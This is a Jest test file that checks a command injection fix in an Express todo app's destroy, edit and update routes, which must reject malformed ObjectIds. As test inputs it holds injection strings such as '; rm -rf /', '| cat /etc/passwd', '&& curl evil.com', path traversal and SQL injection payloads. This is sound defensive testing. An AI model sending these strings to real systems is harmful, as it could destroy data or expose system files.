/**
 * Command Injection Remediation Tests
 *
 * These tests verify that the command injection vulnerability in the routes/index.js
 * file has been properly remediated by validating user input in the destroy, edit,
 * and update functions.
 */

const request = require('supertest');
const express = require('express');
const mongoose = require('mongoose');

// Mock the database models
const mockTodo = {
  find: function() {
    return {
      sort: function() {
        return {
          exec: function(callback) {
            callback(null, []);
          }
        };
      }
    };
  },
  findById: function(id, callback) {
    callback(null, {
      _id: id,
      content: 'Test todo',
      remove: function(cb) {
        cb(null, this);
      },
      save: function(cb) {
        cb(null, this, 1);
      }
    });
  }
};

// Mock mongoose
jest.mock('mongoose', () => ({
  model: jest.fn((modelName) => {
    if (modelName === 'Todo') return mockTodo;
    return {};
  })
}));

// Import routes after mocking
const routes = require('../routes/index');

describe('Command Injection Remediation Tests', () => {
  let app;

  beforeEach(() => {
    // Create a fresh Express app for each test
    app = express();
    app.use(express.json());
    app.use(express.urlencoded({ extended: false }));

    // Set up view engine (mock)
    app.set('view engine', 'ejs');
    app.set('views', __dirname + '/../views');

    // Configure routes
    app.get('/destroy/:id', routes.destroy);
    app.get('/edit/:id', routes.edit);
    app.post('/update/:id', routes.update);
  });

  describe('Valid MongoDB ObjectId Format', () => {
    const validObjectId = '507f1f77bcf86cd799439011';

    test('should accept valid ObjectId in destroy route', (done) => {
      request(app)
        .get(`/destroy/${validObjectId}`)
        .expect((res) => {
          // Should not return 400 error
          expect(res.status).not.toBe(400);
        })
        .end(done);
    });

    test('should accept valid ObjectId in edit route', (done) => {
      request(app)
        .get(`/edit/${validObjectId}`)
        .expect((res) => {
          // Should not return 400 error
          expect(res.status).not.toBe(400);
        })
        .end(done);
    });

    test('should accept valid ObjectId in update route', (done) => {
      request(app)
        .post(`/update/${validObjectId}`)
        .send({ content: 'Updated content' })
        .expect((res) => {
          // Should not return 400 error
          expect(res.status).not.toBe(400);
        })
        .end(done);
    });
  });

  describe('Command Injection Attack Prevention', () => {
    test('should reject command injection attempt with semicolon in destroy route', (done) => {
      const maliciousId = '507f1f77bcf86cd799439011; rm -rf /';
      request(app)
        .get(`/destroy/${maliciousId}`)
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject command injection attempt with pipe in edit route', (done) => {
      const maliciousId = '507f1f77bcf86cd799439011 | cat /etc/passwd';
      request(app)
        .get(`/edit/${maliciousId}`)
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject command injection attempt with backticks in update route', (done) => {
      const maliciousId = '507f1f77bcf86cd799439011`whoami`';
      request(app)
        .post(`/update/${maliciousId}`)
        .send({ content: 'Test' })
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject command injection with dollar sign command substitution', (done) => {
      const maliciousId = '507f1f77bcf86cd799$(touch /tmp/pwned)';
      request(app)
        .get(`/destroy/${maliciousId}`)
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject command injection with ampersand', (done) => {
      const maliciousId = '507f1f77bcf86cd799439011 && curl evil.com';
      request(app)
        .get(`/edit/${maliciousId}`)
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject command injection with newline character', (done) => {
      const maliciousId = '507f1f77bcf86cd799439011\nrm -rf /';
      request(app)
        .get(`/update/${maliciousId}`)
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });
  });

  describe('Invalid Input Format Rejection', () => {
    test('should reject ID that is too short', (done) => {
      request(app)
        .get('/destroy/abc123')
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject ID that is too long', (done) => {
      request(app)
        .get('/edit/507f1f77bcf86cd799439011507f1f77bcf86cd799439011')
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject ID with non-hexadecimal characters', (done) => {
      request(app)
        .post('/update/507f1f77bcf86cd799439xyz')
        .send({ content: 'Test' })
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject ID with special characters', (done) => {
      request(app)
        .get('/destroy/507f1f77bcf86cd799439!@#')
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject empty ID', (done) => {
      request(app)
        .get('/edit/')
        .expect(404) // Will be 404 as route won't match
        .end(done);
    });

    test('should reject ID with spaces', (done) => {
      request(app)
        .get('/destroy/507f1f77 bcf86cd799439011')
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject path traversal attempt', (done) => {
      request(app)
        .get('/edit/../../../etc/passwd')
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject URL encoded special characters', (done) => {
      request(app)
        .get('/destroy/507f1f77bcf86cd799439011%3Bls')
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });
  });

  describe('Edge Cases', () => {
    test('should accept uppercase hexadecimal ObjectId', (done) => {
      const upperCaseId = '507F1F77BCF86CD799439011';
      request(app)
        .get(`/edit/${upperCaseId}`)
        .expect((res) => {
          // Should not return 400 error
          expect(res.status).not.toBe(400);
        })
        .end(done);
    });

    test('should accept mixed case hexadecimal ObjectId', (done) => {
      const mixedCaseId = '507f1F77BcF86cD799439011';
      request(app)
        .get(`/destroy/${mixedCaseId}`)
        .expect((res) => {
          // Should not return 400 error
          expect(res.status).not.toBe(400);
        })
        .end(done);
    });

    test('should reject null character injection', (done) => {
      const nullInjection = '507f1f77bcf86cd799439011\x00malicious';
      request(app)
        .get(`/edit/${nullInjection}`)
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject Unicode escape sequences', (done) => {
      const unicodeEscape = '507f1f77bcf86cd799\\u0065tc';
      request(app)
        .get(`/update/${unicodeEscape}`)
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });
  });

  describe('Security Regression Prevention', () => {
    test('should ensure validation occurs before database query in destroy', (done) => {
      // This test ensures that invalid input is rejected BEFORE
      // the database query is executed, preventing potential injection
      const invalidId = '"; DROP TABLE todos; --';
      request(app)
        .get(`/destroy/${invalidId}`)
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should ensure validation occurs before database query in edit', (done) => {
      const invalidId = "' OR '1'='1";
      request(app)
        .get(`/edit/${invalidId}`)
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should ensure validation occurs before database query in update', (done) => {
      const invalidId = '../../../../../../etc/passwd';
      request(app)
        .post(`/update/${invalidId}`)
        .send({ content: 'Test' })
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });

    test('should reject all 24 MongoDB ObjectId edge cases', (done) => {
      // Test boundary: exactly 24 chars but not all hex
      const almostValidId = '507f1f77bcf86cd79943901g'; // 'g' is not hex
      request(app)
        .get(`/destroy/${almostValidId}`)
        .expect(400)
        .expect('Invalid ID format')
        .end(done);
    });
  });

  describe('Functional Correctness After Remediation', () => {
    test('should still process legitimate requests correctly in destroy', (done) => {
      const validId = '507f1f77bcf86cd799439011';
      request(app)
        .get(`/destroy/${validId}`)
        .expect((res) => {
          // Should be redirected or processed successfully (not 400)
          expect(res.status).not.toBe(400);
          expect(res.text).not.toBe('Invalid ID format');
        })
        .end(done);
    });

    test('should still process legitimate requests correctly in edit', (done) => {
      const validId = '507f1f77bcf86cd799439011';
      request(app)
        .get(`/edit/${validId}`)
        .expect((res) => {
          // Should be processed successfully (not 400)
          expect(res.status).not.toBe(400);
          expect(res.text).not.toBe('Invalid ID format');
        })
        .end(done);
    });

    test('should still process legitimate requests correctly in update', (done) => {
      const validId = '507f1f77bcf86cd799439011';
      request(app)
        .post(`/update/${validId}`)
        .send({ content: 'Updated todo content' })
        .expect((res) => {
          // Should be processed successfully (not 400)
          expect(res.status).not.toBe(400);
          expect(res.text).not.toBe('Invalid ID format');
        })
        .end(done);
    });
  });
});
